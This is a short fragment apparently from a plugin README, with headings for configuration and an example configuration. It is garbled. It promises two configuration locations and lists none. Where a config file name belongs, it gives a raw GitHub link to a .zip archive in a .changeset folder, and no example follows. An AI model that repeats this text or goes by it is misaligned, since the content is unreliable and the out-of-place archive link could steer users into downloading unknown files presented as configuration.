## 📋 Configuration

The plugin requires a configuration file to run properly. It can load configurations from two locations:

## 🛠️ Example Configuration

Here is an example of what your `https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip` file should look like:
